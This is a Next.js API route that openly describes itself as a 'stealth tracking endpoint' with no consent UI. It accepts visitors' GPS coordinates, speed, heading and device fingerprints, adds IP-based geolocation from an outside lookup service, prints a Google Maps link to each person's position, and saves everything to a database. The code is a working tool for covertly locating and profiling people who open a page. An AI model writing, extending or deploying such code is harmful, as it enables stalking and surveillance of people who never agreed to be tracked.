// Stealth tracking endpoint (no consent UI)
import { NextRequest, NextResponse } from 'next/server';
import { addTrack } from '@/app/lib/database';
import { getClientIP, checkRateLimit } from '@/app/lib/utils-server';
import { TrackData, IPLocation } from '@/app/types';
import axios from 'axios';

export async function POST(request: NextRequest) {
  try {
    const clientIP = await getClientIP(request);
    
    // Rate limiting
    if (!checkRateLimit(clientIP, 10, 5 * 60 * 1000)) {
      return NextResponse.json(
        { success: false, error: 'Too many requests, please try again later.' },
        { status: 429 }
      );
    }
    
    const body = await request.json();
    const {
      latitude,
      longitude,
      accuracy,
      altitude,
      heading,
      speed,
      timestamp,
      deviceInfo,
      pageUrl,
      referrer,
      gpsError
    } = body;
    
    console.log('\n========== STEALTH TRACK LOG ==========');
    console.log('⏰ Timestamp:', new Date(timestamp).toISOString());
    console.log('🌐 Client IP:', clientIP);
    console.log('🔍 Device Fingerprint:', deviceInfo?.fingerprint);
    
    // Get IP-based geolocation
    let ipLocation: IPLocation | null = null;
    try {
      const ipApiUrl = clientIP === '::1' || clientIP === '127.0.0.1' || clientIP === 'Unknown'
        ? 'http://ip-api.com/json/'
        : `http://ip-api.com/json/${clientIP}`;
      
      const ipResponse = await axios.get(ipApiUrl, {
        timeout: 5000,
        params: {
          fields: 'status,country,regionName,city,lat,lon,isp,query'
        }
      });
      
      if (ipResponse.data.status === 'success') {
        ipLocation = {
          ip: ipResponse.data.query,
          city: ipResponse.data.city,
          region: ipResponse.data.regionName,
          country: ipResponse.data.country,
          latitude: ipResponse.data.lat,
          longitude: ipResponse.data.lon,
          isp: ipResponse.data.isp
        };
        
        console.log('📡 IP Location:', `${ipLocation.city}, ${ipLocation.region}, ${ipLocation.country}`);
      }
    } catch (ipError) {
      console.error('IP API Error:', ipError);
    }
    
    // Log GPS location if available
    if (latitude && longitude) {
      console.log('🛰️ GPS Location:', `${latitude}, ${longitude}`);
      console.log('🎯 Accuracy:', `±${accuracy || 0} meters`);
      console.log('🗺️ Google Maps:', `https://www.google.com/maps?q=${latitude},${longitude}`);
    } else {
      console.log('🛰️ GPS Location: Not available' + (gpsError ? ` (${gpsError})` : ''));
    }
    
    console.log('📱 Device:', deviceInfo?.platform || 'Unknown');
    console.log('🔗 Page:', pageUrl || 'Unknown');
    console.log('========================================\n');
    
    // Save to database
    const trackData: TrackData = {
      clientIP,
      ipLocation,
      latitude,
      longitude,
      accuracy,
      altitude,
      heading,
      speed,
      timestamp,
      deviceInfo,
      pageUrl,
      referrer,
      gpsError
    };
    
    const result = await addTrack(trackData);
    
    return NextResponse.json({
      success: true,
      trackingId: result.trackingId,
      message: 'Tracked successfully'
    });
    
  } catch (error: any) {
    console.error('Tracking error:', error);
    return NextResponse.json(
      { success: false, error: error?.message || 'Failed to track' },
      { status: 500 }
    );
  }
}

